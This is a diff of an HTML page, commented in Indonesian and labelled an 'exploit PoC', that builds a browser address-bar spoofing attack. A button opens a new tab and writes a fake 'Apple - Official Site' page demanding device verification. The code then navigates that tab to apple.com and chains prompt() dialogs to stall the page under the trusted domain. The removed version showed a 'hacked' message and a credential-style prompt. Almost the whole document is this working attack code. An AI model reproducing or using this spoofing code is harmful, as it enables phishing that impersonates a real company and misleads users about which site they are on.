@@ -6,62 +6,116 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>testertster</title>
+    <title>Advanced Spoofing & Lifecycle Research Harness</title>
     <style>
-      body,
-      html {
+      body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fff;
+        background: #000;
+        color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .box {
+        text-align: center;
+        padding: 30px;
       }
       button {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        padding: 15px 30px;
-        font-size: 18px;
-        background: #007aff;
+        padding: 20px 40px;
+        font-size: 20px;
+        font-weight: bold;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 10px;
+        border-radius: 12px;
         cursor: pointer;
+        box-shadow: 0 4px 15px rgba(255, 59, 48, 0.4);
+        transition: transform 0.1s, background 0.2s;
+      }
+      button:active {
+        transform: scale(0.98);
       }
     </style>
   </head>
   <body>
-    <button id="startBtn">CLICK HERE</button>
+    <div class="box">
+      <button id="triggerBtn">JALANKAN EXPLOIT POC</button>
+    </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
+      // Pemantauan Lifecycle Pageshow untuk sinkronisasi frame
+      window.addEventListener('pageshow', (event) => {
+          console.log('[Harness] Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
+          requestAnimationFrame(() => {
+              requestAnimationFrame(() => {
+                  console.log('[Harness] Stabilisasi frame lifecycle selesai.');
+              });
+          });
+      });
+
+      document.getElementById("triggerBtn").onclick = function () {
         this.remove();
+        console.log('[Harness] Tombol diklik. Memulai rangkaian eksekusi...');
 
-        const newTab = window.open("google com:9090", "_blank");
-
-        if (newTab) {
-          newTab.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>testertester</title></head>
-        <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
-          <div>
-            <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE</h1>
-            <p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
-          </div>
-        </body>
-        </html>
-      `);
-          newTab.document.close();
-
-          setTimeout(() => {
-            newTab.location.href = "https://apple.com:9090";
-          }, 1);
+        // 1. Manipulasi State History Lokal
+        try {
+            history.pushState({ trustedState: true }, '', '/trusted');
+            console.log('[Harness] history.pushState sukses ke /trusted.');
+        } catch (err) {
+            console.error('[Harness] Error pushState:', err);
         }
 
-        setTimeout(function () {
-          const pwd = prompt("ROOT CAUSE");
-        }, 500);
+        // 2. Membuka jendela/tab baru target
+        const targetTab = window.open("about:blank", "_blank");
+
+        if (targetTab) {
+          // 3. Menulis payload visual penyerang ke dalam tab baru
+          targetTab.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <meta charset="utf-8">
+              <title>Apple - Official Site</title>
+            </head>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+              <div style="padding: 30px; max-width: 600px;">
+                <h1 style="font-size:48px;font-weight:900;color:#1d1d1f;margin:0 0 20px 0;letter-spacing:-1.5px;"> Apple Store</h1>
+                <p style="font-size:22px;font-weight:600;color:#333333;margin:0 0 15px 0;">Verifikasi Perangkat Anda Diperlukan</p>
+                <p style="font-size:16px;color:#86868b;line-height:1.5;margin:0;">Viewport dikunci di bawah domain terpercaya sementara proses sinkronisasi antarmuka dihentikan.</p>
+              </div>
+            </body>
+            </html>
+          `);
+          targetTab.document.close();
+          console.log('[Harness] Konten overlay berhasil dirender di tab baru.');
+
+          // 4. Kalibrasi Timing Navigasi Asinkron ke Target Eksternal
+          setTimeout(() => {
+            try {
+              targetTab.location.href = "https://apple.com";
+              console.log('[Harness] Navigasi ke apple.com dipicu.');
+            } catch (err) {
+              console.error("Navigation dispatch error:", err);
+            }
+          }, 15);
+
+          // 5. Rangkaian Thread Stalling (Prompt Chain) untuk Analisis Timing
+          setTimeout(() => {
+            try {
+              for(let i = 0; i < 3; i++) {
+                targetTab.prompt("CRITICAL_SECURITY_EXCEPTION_" + i);
+              }
+              console.log('[Harness] Rangkaian prompt chain selesai diproses.');
+            } catch (err) {
+              console.error("Thread blocking failed:", err);
+            }
+          }, 180);
+        } else {
+          console.warn('[Harness] Peringatan: Jendela pop-up diblokir oleh peramban.');
+        }
       };
     </script>
   </body>
